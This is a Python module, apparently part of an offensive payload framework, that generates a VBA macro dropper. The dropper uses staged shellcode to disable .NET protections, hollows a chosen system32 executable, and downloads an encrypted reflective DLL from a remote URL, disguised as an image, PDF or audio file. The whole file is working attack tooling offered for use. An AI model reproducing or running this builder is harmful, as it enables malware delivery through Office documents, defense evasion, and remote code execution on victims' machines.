
from lib.interfaces.module_interface import ModuleInterface
from lib.handlers.generic import quotedstring, escapebackslash
from lib.tab_completers.generic import tab_choice
from lib.validators.generic import iswebaddress, ischoice
from lib.validators.files import isbasename, isreadable
from data.scripts.BinaryToVbaFunc import BinaryToVbaFunc
import os
import base64


BINARYSTRING = b"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
SHELLCODESTRING= b"S"*6144


class Template(ModuleInterface): #usename
    def __init__(self, templatePath, helpers):
        options = {}
        self.templatePath = templatePath
        self.helpers = helpers
        self.randomkey = helpers.binary.getAESKey()
        self.encodings = { "0": "-", "6": "!" }
        options['binaryname'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "The target EXE to hollow. Must be in system32/syswow64 (ex. rundll32.exe)",
            "validator": isbasename,
            "handler": quotedstring
        }
        options['version'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "version of .NET to target 3.X or 4.X (v3, v4)",
            "validator": ischoice,
            "validatorargs": {'choices': ['v3', 'v4']},
            "tab_complete": tab_choice,
            "tab_args": {'choices': ['v3', 'v4']}
        }
        options['url'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "Location we'll pull the output_stagefile from",
            "validator": iswebaddress,
            "handler": escapebackslash,
            "noinsert": True
        }
        options['output_stagefile'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "Location to write encrypted stage to.  Supported file extensions [.gif, .jpg, .jpeg, .pdf, .mp3, .ico, .bmp, .der]",
            "validator": None,
            "tab_complete": self.helpers.complete_path,
            "handler": None,
            "noinsert": True
        }
        options['input_stagefile'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "Location of Reflective DLL to be encoded / encrypted and sent to output_stagefile",
            "validator": isreadable,
            "tab_complete": self.helpers.complete_path,
            "noinsert": True
        }
        super().__init__(templatePath, options)
    # end __init__

    
    def preprocess(self):

        # Create the stage 2 shellcode which will download our stager from the spawned EXE
        ssl, port, path, host = self.helpers.parseURI(self.options['url']['value'])
        stage2_shellcode = self.helpers.stager.generate_shellcode(ssl, False, port, path, host)
        stage2_shellcode_b64 = self.helpers.generate_base64(stage2_shellcode)
        
        # Create the stage 1 shellcode which will spawn the EXE and hollow it 
        # Convert the shellcode into VBA functions
        stage1_path = os.path.join(
            self.helpers.getpayloaddir(), 
            "dullarrow", 
            "ppidShellcodeSpawn-cleaned.bin"
        )
        if self.options['version']['value'] == 'v4':
            stage1_path += '4'
        stage1_shellcode = ""
        with open(stage1_path, 'rb') as fPayload:
            stage1_shellcode = fPayload.read()
        stage1_shellcode = self.helpers.binary.patchValues(
            SHELLCODESTRING, 
            stage1_shellcode, 
            stage2_shellcode_b64, 
            isurl = 1
        )
        stage1_shellcode = self.helpers.binary.patchValues(
            BINARYSTRING, 
            stage1_shellcode, 
            self.options["binaryname"]["value"].encode('utf-8'), 
            isurl=1
        )
        self.options['getStage_1'] = {
            "value": None,
            "required": True,
            "description": "the generated function which returns the stage1 payload buffer",
            "validator": None,
            "handler": None
        }
        self.options['getStage_1']['value'] = BinaryToVbaFunc(
            stage1_shellcode, 
            'getStage_1', 
            self.encodings
        )
        
        
        # Create the stage 0 shellcode which will disable some .NET v4 protections
        # Convert the shellcode into VBA functions
        stage0_path = os.path.join( 
            self.helpers.getpayloaddir(), 
            "dullarrow",  
            "dullarrow_disable_payload.bin"
        )
        stage0_shellcode = ""
        with open(stage0_path, 'rb') as fPayload:
            stage0_shellcode = fPayload.read()
        self.options['getStage_0'] = {
            "value": None,
            "required": True,
            "description": "the generated function which returns the stage0 payload buffer",
            "validator": None,
            "handler": None
        }
        self.options['getStage_0']['value'] = BinaryToVbaFunc(
            stage0_shellcode, 
            'getStage_0', 
            self.encodings
        )
        
        # Update the template if .NET v4 is targeted                    
        if self.options['version']['value'] == 'v4':
            template_path = os.path.join(os.path.dirname(self.templatePath), "TEMPLATE_v4.vba")
        else:
            template_path = self.templatePath
        with open(template_path, 'r') as fp:
            self.template = fp.read()
            
    # end preprocess


    def postprocess(self):
        # Remove the generated shellcode functions from the options
        del self.options['getStage_0']
        del self.options['getStage_1']
        
        file_type = self.options['output_stagefile']['value'].split('.')[-1]
        payload = self.helpers.stager.generate_patched_dll(
            self.options['input_stagefile']['value'], 
            type=file_type
        )
        with open(self.options['output_stagefile']['value'], 'wb') as fp:
            fp.write(payload)
    # end postprocess

